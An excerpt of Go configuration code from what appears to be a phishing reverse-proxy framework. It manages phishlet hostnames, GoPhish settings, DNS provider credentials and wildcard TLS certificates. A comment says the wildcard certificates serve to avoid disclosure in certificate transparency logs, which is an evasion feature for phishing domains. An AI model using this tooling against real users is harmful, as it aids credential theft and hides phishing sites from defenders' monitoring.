...
type GeneralConfig struct {
	...
	WildcardCerts bool   `mapstructure:"wildcard_certs" json:"wildcard_certs" yaml:"wildcard_certs"`
}
...
func NewConfig(cfg_dir string, path string) (*Config, error) {
	c := &Config{
		...
		certificates:    &CertificatesConfig{},
		gophishConfig:   &GoPhishConfig{},
		dnsConfig:       &DNSProviderConfig{TTL: 300},
	...
	c.cfg.UnmarshalKey(CFG_DNS, &c.dnsConfig)
	if c.dnsConfig.TTL == 0 {
		c.dnsConfig.TTL = 300
	}
...
func (c *Config) EnableWildcardCerts(enabled bool) {
	c.general.WildcardCerts = enabled
	if enabled {
		log.Info("wildcard certificates are now enabled (requires external DNS for DNS-01 challenge)")
	} else {
		log.Info("wildcard certificates are now disabled")
	}
	c.cfg.Set(CFG_GENERAL, c.general)
	c.cfg.WriteConfig()
}

func (c *Config) IsWildcardCertsEnabled() bool {
	return c.general.WildcardCerts
}
...
// GetWildcardHostnames returns hostnames in wildcard format (*.domain.com)
// Used for obtaining wildcard TLS certificates to prevent CT log disclosure
func (c *Config) GetWildcardHostnames() []string {
	var ret []string
	...
	for _, site := range sites {
		...
		// Get wildcard format for each phishlet domain
		for _, host := range pl.GetPhishHosts(true) {
			if !seen[host] {
				ret = append(ret, strings.ToLower(host))
				seen[host] = true
			}
...
// GetBaseDomains returns unique base domains from all enabled phishlets
func (c *Config) GetBaseDomains() []string {
	var ret []string
	seen := make(map[string]bool)
	sites := c.GetEnabledSites()
	
	for _, site := range sites {
		domain, ok := c.GetSiteDomain(site)
		if ok && !seen[domain] {
...
func (c *Config) GetDNSConfig() *DNSProviderConfig {
	return c.dnsConfig
}

func (c *Config) SaveDNSConfig() {
	c.cfg.Set(CFG_DNS, c.dnsConfig)
	c.cfg.WriteConfig()
}

func (c *Config) SetDNSProvider(provider string) {
	providers := []string{"cloudflare", "route53", "digitalocean", ""}
	if !stringExists(strings.ToLower(provider), providers) {
		log.Error("invalid DNS provider. supported: cloudflare, route53, digitalocean")
		return
	}
	c.dnsConfig.Provider = strings.ToLower(provider)
	c.SaveDNSConfig()
	if provider != "" {
		log.Info("DNS provider set to: %s", provider)
	} else {
		log.Info("DNS provider cleared")
	}
}

func (c *Config) SetDNSApiKey(apiKey string) {
	c.dnsConfig.ApiKey = apiKey
	c.SaveDNSConfig()
	if apiKey != "" {
		log.Info("DNS API key set")
	} else {
		log.Info("DNS API key cleared")
	}
}

func (c *Config) SetDNSApiSecret(apiSecret string) {
	c.dnsConfig.ApiSecret = apiSecret
	c.SaveDNSConfig()
	if apiSecret != "" {
		log.Info("DNS API secret set")
	} else {
		log.Info("DNS API secret cleared")
	}
}

func (c *Config) SetDNSZoneID(zoneID string) {
	c.dnsConfig.ZoneID = zoneID
	c.SaveDNSConfig()
	if zoneID != "" {
		log.Info("DNS zone ID set to: %s", zoneID)
	} else {
		log.Info("DNS zone ID cleared")
	}
}

func (c *Config) SetDNSTTL(ttl int) {
	if ttl < 60 {
		ttl = 60
	}
	c.dnsConfig.TTL = ttl
	c.SaveDNSConfig()
	log.Info("DNS TTL set to: %d seconds", ttl)
}

func (c *Config) EnableDNS(enabled bool) {
	c.dnsConfig.Enabled = enabled
	c.SaveDNSConfig()
	if enabled {
		log.Info("external DNS management enabled")
	} else {
		log.Info("external DNS management disabled")
	}
}

func (c *Config) EnableDNSAutoSync(enabled bool) {
	c.dnsConfig.AutoSync = enabled
	c.SaveDNSConfig()
	if enabled {
		log.Info("DNS auto-sync enabled")
	} else {
		log.Info("DNS auto-sync disabled")
	}
}

func (c *Config) IsDNSEnabled() bool {
	return c.dnsConfig.Enabled
}

func (c *Config) IsDNSAutoSyncEnabled() bool {
	return c.dnsConfig.AutoSync
}
